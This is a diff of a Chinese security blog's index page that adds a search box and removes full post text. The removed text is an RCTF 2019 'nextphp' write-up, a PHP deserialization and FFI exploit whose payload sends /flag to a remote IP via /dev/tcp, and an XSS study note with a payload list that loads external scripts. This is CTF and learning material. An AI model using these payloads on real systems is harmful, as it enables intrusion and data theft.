@@ -277,6 +277,14 @@
 
       
       
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
     </ul>
   
 
@@ -285,6 +293,27 @@
 
   
 
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
   
 </nav>
 
@@ -426,54 +455,22 @@
       
         
           
-            <h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>PHP is the best language!</p>
-<p><a href="http://nextphp.2019.rctf.rois.io" target="_blank" rel="noopener">http://nextphp.2019.rctf.rois.io</a></p>
-<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>php代码没有对eval函数中的参数进行任何过滤，猜测存在任意命令执行漏洞</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nextphp.2019.rctf.rois.io/?a=echo phpinfo();</span></span><br></pre></td></tr></table></figure>
-
-<p>查看php配置信息，发现过滤了大多数系统函数<br><img src="https://img-blog.csdnimg.cn/20190520231338443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODA5ODk2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>但没有过滤scandir()<br><img src="https://img-blog.csdnimg.cn/2019052023003167.png" alt="在这里插入图片描述"></p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nextphp.2019.rctf.rois.io/?a=var_dump(scandir('/var/www/html'));</span></span><br></pre></td></tr></table></figure>
-
-<p>爆出网站根目录文件</p>
-<p><img src="https://img-blog.csdnimg.cn/20190521012241431.png" alt="在这里插入图片描述"></p>
-<p>利用file_get_contents()查看preload.php源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://nextphp.2019.rctf.rois.io/?a=echo%20file_get_contents(%27preload.php%27);</span><br></pre></td></tr></table></figure>
-
-<p>preload.php源码</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="title">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    protected $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'print_r'</span>,</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'1'</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;data[<span class="string">'ret'</span>] = $<span class="keyword">this</span>-&gt;data[<span class="string">'func'</span>]($<span class="keyword">this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params">array $data</span>) </span>&#123;</span><br><span class="line">        array_merge($<span class="keyword">this</span>-&gt;data, $data);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize($<span class="keyword">this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params">$payload</span>) </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;data = unserialize($payload);</span><br><span class="line">        $<span class="keyword">this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params">$key</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params">$key, $value</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \Exception(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \Exception(<span class="string">'No implemented'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>PHP7.4新特性：新的自定义对象序列化机制<br>  <a href="https://wiki.php.net/rfc/custom_object_serialization" target="_blank" rel="noopener">关于<strong>serialize和</strong>unserialize</a></li>
-</ul>
-<p>观察代码，发现对象反序列时会执行run()方法</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    $<span class="keyword">this</span>-&gt;data[<span class="string">'ret'</span>] = $<span class="keyword">this</span>-&gt;data[<span class="string">'func'</span>]($<span class="keyword">this</span>-&gt;data[<span class="string">'arg'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>可以结合__get魔法函数，获取对象data数组中的元素值</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params">$key</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;data[$key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>构造自己的序列化对象并调用反序列化方法，include引入preload.php页面，注入代码，查看ret参数</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nextphp.2019.rctf.rois.io/?a=include(%27preload.php%27);var_dump(unserialize(%27C:1:%22A%22:150:&#123;a:3:&#123;s:3:%22ret%22;N;s:4:%22func%22;s:7:%22print_r%22;s:3:%22arg%22;a:3:&#123;s:1:%22a%22;s:5:%22apple%22;s:1:%22b%22;s:6:%22banana%22;s:1:%22c%22;a:3:&#123;i:0;s:1:%22x%22;i:1;s:1:%22y%22;i:2;s:1:%22z%22;&#125;&#125;&#125;&#125;%27)-%3E__get(%27ret%27));</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/20190520234009226.png" alt="在这里插入图片描述"><br>成功执行print_r()函数打印出数组</p>
-<p>接下来就是想办法使用系统函数，利用将func修改为system或者exec之类的，但转念一想，能执行系统命令的危险函数不是都被过滤了吗？到这里卡住了。</p>
-<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p><a href="https://ctftime.org/writeup/15350" target="_blank" rel="noopener">ROIS战队Writeup</a></p>
-<p><strong>preload.php</strong>这个文件名也是hint，google搜索preload site:php.net发现php中的<a href="https://wiki.php.net/rfc/preload" target="_blank" rel="noopener">预加载机制</a><br>配合Writeup中提到了<a href="https://wiki.php.net/rfc/ffi" target="_blank" rel="noopener">FFI扩展</a>可以实现任意代码执行。对于PHP，FFI开辟了一种在纯PHP中编写PHP扩展和绑定到C库的方法。</p>
-<ul>
-<li><p>php.ini配置使用preload预加载与FFI扩展</p>
-  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ffi.enable = preload </span><br><span class="line">opcache.preload = preload.php</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>注：<br>  在preload机制中，preload.php中定义的所有函数和大多数类都将永久加载到PHP的函数和类表中，并在将来的任何请求的上下文中永久可用，所以在注入代码的时候，并不需要include(‘preload.php’)文件</p>
-</li>
-</ul>
-<p>构造序列化对象</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    protected $data = [</span><br><span class="line">        <span class="string">'ret'</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">'func'</span> =&gt; <span class="string">'FFI::cdef'</span>,</span><br><span class="line">        # 使用C库函数</span><br><span class="line">        <span class="string">'arg'</span> =&gt; <span class="string">'int system(const char *command);'</span></span><br><span class="line">    ];</span><br><span class="line">...</span><br><span class="line">	$obj = <span class="keyword">new</span> A;</span><br><span class="line">	$ser = serialize($obj);</span><br><span class="line">	echo $ser; </span><br><span class="line"></span><br><span class="line"># 输出序列化对象</span><br><span class="line">C:<span class="number">1</span>:<span class="string">"A"</span>:<span class="number">95</span>:&#123;<span class="attr">a</span>:<span class="number">3</span>:&#123;<span class="attr">s</span>:<span class="number">3</span>:<span class="string">"ret"</span>;N;s:<span class="number">4</span>:<span class="string">"func"</span>;s:<span class="number">9</span>:<span class="string">"FFI::cdef"</span>;s:<span class="number">3</span>:<span class="string">"arg"</span>;s:<span class="number">32</span>:<span class="string">"int system(const char *command);"</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Payload</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//nextphp.2019.rctf.rois.io/?a=unserialize('C:1:"A":95:&#123;a:3:&#123;s:3:"ret";N;s:4:"func";s:9:"FFI::cdef";s:3:"arg";s:32:"int system(const char *command);";&#125;&#125;&#125;')-&gt;__get('ret')-&gt;system('bash -c "cat /flag &gt; /dev/tcp/167.99.105.52/8080"');</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="Get-flag"><a href="#Get-flag" class="headerlink" title="Get flag"></a>Get flag</h2><p><img src="https://img-blog.csdnimg.cn/20190521011445961.png" alt="在这里插入图片描述"></p>
-
+            <p>
+              问题PHP is the best language!
+http://nextphp.2019.rctf.rois.io
+解题php代码没有对eval函数中的参数进行任何过滤，猜测存在任意命令执行漏洞
+http://nextphp.2019.rctf.rois.io/?a=echo phpinfo(
+              ...
+            </p>
+          <!--noindex-->
           
+            <div class="post-button text-center">
+              <a class="btn" href="/2019/07/24/RCTF2019 nextphp writeup/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          
+          <!--/noindex-->
         
       
     </div>
@@ -631,489 +628,20 @@
       
         
           
-            <h2 id="XSS漏洞基础"><a href="#XSS漏洞基础" class="headerlink" title="XSS漏洞基础"></a>XSS漏洞基础</h2><h4 id="XSS入门介绍"><a href="#XSS入门介绍" class="headerlink" title="XSS入门介绍"></a>XSS入门介绍</h4><p><a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank" rel="noopener">https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)</a></p>
-<h4 id="解析器如何工作"><a href="#解析器如何工作" class="headerlink" title="解析器如何工作"></a>解析器如何工作</h4><p>For example, a  tag may be able to terminate a script block even if it is injected inside a quoted string inside a method call inside the script. This happens because the HTML parser runs before the JavaScript parser.</p>
-<ul>
-<li>XSS解析器就是浏览器</li>
-</ul>
-<h4 id="HTML-entities（HTML-实体）"><a href="#HTML-entities（HTML-实体）" class="headerlink" title="HTML entities（HTML 实体）"></a>HTML entities（HTML 实体）</h4><p>HTML中的保留字符（Reserved characters）都会被替换为HTML实体（&lt;&gt;）<br><a href="https://www.w3schools.com/html/html_entities.asp" target="_blank" rel="noopener">https://www.w3schools.com/html/html_entities.asp</a> </p>
-<h4 id="浏览器如何解码（Freebuf博主）"><a href="#浏览器如何解码（Freebuf博主）" class="headerlink" title="浏览器如何解码（Freebuf博主）"></a>浏览器如何解码（Freebuf博主）</h4><p><a href="https://www.freebuf.com/articles/web/10121.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/10121.html</a></p>
-<h4 id="XSS漏洞复现"><a href="#XSS漏洞复现" class="headerlink" title="XSS漏洞复现"></a>XSS漏洞复现</h4><p><a href="http://v0w.top/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/#%E5%AD%98%E5%82%A8%E5%9E%8BXSS" target="_blank" rel="noopener">http://v0w.top/2018/08/16/XSS%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/#%E5%AD%98%E5%82%A8%E5%9E%8BXSS</a></p>
-<ul>
-<li>&lt; script &gt;标签内的标准弹框语句，不经过数据库存取<br>  alert(1)<br>  alert(“xss”)<br>  alert(/xss/)<br>  alert(‘xss’)</li>
-</ul>
-<ul>
-<li>经过数据库存取<br>  alert(1)<br>  alert(“xss”)<br>  alert(/xss/)<br>  alert(\ ‘xss\ ‘)（mysql插入数据时默认用单引号包围，再包括单引号出现语法错误）</li>
-</ul>
-<ul>
-<li>DOM复现的绕过语句：<br>‘&gt;&lt; img src=# onerror=”alert(‘XSS’)”&gt;&lt;’<br>‘ onclick=alert(/xss/) //<br>‘ onclick=’alert(/xss/)’     # 单引号双引号都没有关系</li>
-<li>注：<br>“    &gt;testLink    “前面的有个单引号，如果没有明显的引号与前面的属性分开，会与前面的属性结合后再自动添加引号（如果是事件类型），所以可以使用“  空格//  ”分隔，或者直接显示用引号包括事件，如上第二种解决方法。</li>
-</ul>
-<h4 id="DVWA安装："><a href="#DVWA安装：" class="headerlink" title="DVWA安装："></a>DVWA安装：</h4><p><a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener">https://github.com/ethicalhack3r/DVWA</a></p>
-<h4 id="DVWA靶场游玩攻略（XSS）："><a href="#DVWA靶场游玩攻略（XSS）：" class="headerlink" title="DVWA靶场游玩攻略（XSS）："></a>DVWA靶场游玩攻略（XSS）：</h4><p><a href="https://www.freebuf.com/articles/web/123779.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/123779.html</a><br><a href="https://www.hackingarticles.in/understanding-dom-based-xss-dvwa-bypass-security/" target="_blank" rel="noopener">https://www.hackingarticles.in/understanding-dom-based-xss-dvwa-bypass-security/</a></p>
-<p><strong>DVWA XSS Reflected</strong><br>•    过滤了“&lt; script &gt;”标签，使用大小写，双写， 添加src属性绕过</p>
-<p>•    若采用正则匹配过滤“&lt; script &gt;”，之前方法都行不通，考虑使用其他标签：<br>​    iframe<br>​    input<br>     img<br>​    body<br>​    添加src属性，利用鼠标事件（通用）：<br>​    &lt; IMG SRC=# onmouseover=”alert(‘xxs’)”&gt;<br>​    利用error事件，适用img<br>​    &lt; IMG SRC=/ onerror=”alert(String.fromCharCode(88,83,83))”&gt;</p>
-<p>•    htmlspecialchars( $_GET[ ‘name’ ] );无解</p>
-<p><strong>DVWA XSS Store</strong><br>•    mysqli_real_escape_string()转移字符串（SQL中的特殊字符）：<br>一次转义对SQL命令并无太大影响，数据库会存储未转义前的字符</p>
-<p>•    stripslashes()去除反斜杠</p>
-<p>•    name字段的限制可以通过burp抓包修改</p>
-<p>•    addslashes( $ message ),mysqli_real_escape_string（$ message）,htmlspecialchars( $ message )，多次转义，数据库中的特殊符号带上反斜杠，并且$message中的HTML保留字符被转换为HTML实体，impossible级别</p>
-<p><strong>DVWA DOM XSS</strong><br>•    基于client的XSS漏洞<br>•    the hash symbol(#)不会被服务端接收到（#后面的部分称为fragment）</p>
-<h4 id="XSS平台搭建"><a href="#XSS平台搭建" class="headerlink" title="XSS平台搭建"></a>XSS平台搭建</h4><ul>
-<li>教程：<br><a href="https://cread.jd.com/read/startRead.action?bookId=30432053&amp;readType=1" target="_blank" rel="noopener">https://cread.jd.com/read/startRead.action?bookId=30432053&amp;readType=1</a><br><a href="https://blog.csdn.net/u011781521/article/details/53895363" target="_blank" rel="noopener">https://blog.csdn.net/u011781521/article/details/53895363</a>  </li>
-<li>window10配置静态文件<br><a href="https://blog.csdn.net/cz_devil/article/details/16826647" target="_blank" rel="noopener">https://blog.csdn.net/cz_devil/article/details/16826647</a><br><a href="https://blog.csdn.net/qq_16241043/article/details/54176442" target="_blank" rel="noopener">https://blog.csdn.net/qq_16241043/article/details/54176442</a></li>
-<li>查看Apache启动失败的错误信息：<br>打开cmd，输入：D:\phpStudy\Apache\binhttpd.exe -t 回车，即显示错误信息</li>
-</ul>
-<h2 id="XSS漏洞挖掘"><a href="#XSS漏洞挖掘" class="headerlink" title="XSS漏洞挖掘"></a>XSS漏洞挖掘</h2><p><strong>识别URL上的输入点</strong><br>可控点：&lt; path&gt;&lt; query&gt;&lt; fragement&gt;<br>•    web2.0的URL与传统形式上的差异：更强调明确含义（web2.0url名称与传统URL的映射）<br>•    需要强大的爬虫进行识别<br>•    fragment可能出现在服务端解析中</p>
-<p><strong>进行XSS测试时，可能的输出点</strong></p>
-<p><strong>HTML标签之间</strong></p>
-<ol>
-<li>直接输入js代码</li>
-<li>闭合标签（其他标签无法执行HTML代码）</li>
-</ol>
-<ul>
-<li>注：<br>div<br>pre<br>code<br>这三个标签可以解析HTML代码，不可以解析的标签实际上是进行了htmencode编码</li>
-</ul>
-<p><strong>HTML标签之内（属性）</strong></p>
-<ol start="3">
-<li>利用事件（效果比较差）</li>
-<li>闭合属性，闭合标签（成功率较低）</li>
-<li>特殊属性src/href/action<br>href执行javascript伪协议，过滤//，考虑js字符串的加减乘除<br>onerror(适用img)<br>data伪协议</li>
-</ol>
-<p><strong>成为js代码</strong></p>
-<ol start="6">
-<li>闭合script标签</li>
-<li>绕过变量引用</li>
-</ol>
-<p><strong>HTML与js的自解码与编码函数</strong><br>•    HTML标签内（&lt;&gt;&amp;）</p>
-<ol start="8">
-<li>entity_name：&amp;#xH  &amp;#D（可以去除分号）</li>
-<li>entity_number:&lt;</li>
-<li>使用htmlspecialchars（）主动编码</li>
-</ol>
-<p>•    JS上下文内</p>
-<ol start="11">
-<li>unicode格式：\uH（中文要使用）</li>
-<li>普通的八进制：\65\65 </li>
-<li>普通16进制：\xH</li>
-<li>反斜杠：&#39;,&quot;,&lt;,&gt;</li>
-</ol>
-<p><strong>urlncode编码</strong><br>•    firefox 和 chorm都会默认url编码  ‘“&lt;&gt;这四种字符，#号后面单引号不会编码，但其他字符还是会进行编码<br>•    PHP中$_SERVER[QUERY_STRING]获取urlencode后的内容</p>
-<p><strong>URL编码——利用JS统一编码</strong><br><a href="http://www.ruanyifeng.com/blog/2010/02/url_encoding.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2010/02/url_encoding.html</a></p>
-<p><strong>补充：</strong><br>正常unicode格式：\u5487</p>
-<p>escape（）编码后：%u5487<br>escapeURI（）编码后：utf-8方式（三个字节）%E7%A2%94（同样百分号开头）<br>escapeURIComponent（）编码后：类似第二种，所有字符编码</p>
-<ul>
-<li>注：<br>  编码解码函数参数都可以接收unicode字符，<br>  如果是ASCII范围内，结果返回可打印的字符，<br>  如果超出这个范围，编码正常（可能是unicode模式，可能是utf-8形式），解码都是返回相应的字符<br>  思考：<br>  其次，escape()不对”+”编码。但是我们知道，网页在提交表单的时候，如果有空格，则会被转化为+字符。服    务器处理数据的时候，会把+号处理成空格。所以，使用的时候要小心。</li>
-</ul>
-<h4 id="XSS-game"><a href="#XSS-game" class="headerlink" title="XSS game"></a>XSS game</h4><blockquote>
-<p><a href="http://www.behindthefirewalls.com/2014/06/xss-game-by-google-exercises-4-5-and-6.html" target="_blank" rel="noopener">http://www.behindthefirewalls.com/2014/06/xss-game-by-google-exercises-4-5-and-6.html</a></p>
-</blockquote>
-<h4 id="Hack-me"><a href="#Hack-me" class="headerlink" title="Hack me"></a>Hack me</h4><p><a href="https://hack.me/" target="_blank" rel="noopener">https://hack.me/</a></p>
-<h4 id="XSStrike"><a href="#XSStrike" class="headerlink" title="XSStrike"></a>XSStrike</h4><p><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">https://github.com/s0md3v/XSStrike</a></p>
-<h4 id="基于DOM的XSS模糊测试论文（基础打好后再看）"><a href="#基于DOM的XSS模糊测试论文（基础打好后再看）" class="headerlink" title="基于DOM的XSS模糊测试论文（基础打好后再看）"></a>基于DOM的XSS模糊测试论文（基础打好后再看）</h4><p><a href="https://www.hindawi.com/journals/jcnc/2018/8159548/" target="_blank" rel="noopener">https://www.hindawi.com/journals/jcnc/2018/8159548/</a></p>
-<h2 id="附常见的XSS攻击方法"><a href="#附常见的XSS攻击方法" class="headerlink" title="附常见的XSS攻击方法"></a>附常见的XSS攻击方法</h2><p>(1)普通的XSS <a href="https://lvtao.net/tag/javascript/" target="_blank" rel="noopener">JavaScript</a>注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(2)IMG标签XSS使用JavaScript命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=http://3w.org/XSS/xss.js/&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(3)IMG标签无分号无引号</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(4)IMG标签大小写不敏感</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(5)HTML编码(必须有分号)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=javascript:alert(&quot;XSS&quot;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(6)修正缺陷IMG标签</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(7)formCharCode标签(计算器)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(8)UTF-8的Unicode编码(计算器)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(9)7位的UTF-8的Unicode编码是没有分号的(计算器)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=jav..省略..S&apos;)&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(10)十六进制编码也是没有分号(计算器)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(11)嵌入式标签,将Javascript分开</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(12)嵌入式编码标签,将Javascript分开</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(13)嵌入式换行符</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(14)嵌入式回车</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;jav ascript:alert(&apos;XSS&apos;);&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(15)嵌入式多行注入JavaScript,这是XSS极端的例子</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(16)解决限制字符(要求同页面)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&apos;document.&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=z+&apos;write(&quot;&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=z+&apos;&lt;script&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=z+&apos; src=ht&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=z+&apos;tp://ww&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=z+&apos;w.shell&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=z+&apos;.net/1.&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=z+&apos;js&gt;&lt;/sc&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;z=z+&apos;ript&gt;&quot;)&apos;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;eval_r(z)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>(17)空字符12-7-1 T00LS - Powered by Discuz! Board</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.a.com/viewthread.php?action=printable&amp;tid=15267 2/6</span><br><span class="line"></span><br><span class="line">perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&apos; &gt; out</span><br></pre></td></tr></table></figure>
-
-<p>(18)空字符2,空字符在国内基本没效果.因为没有地方可以利用</p>
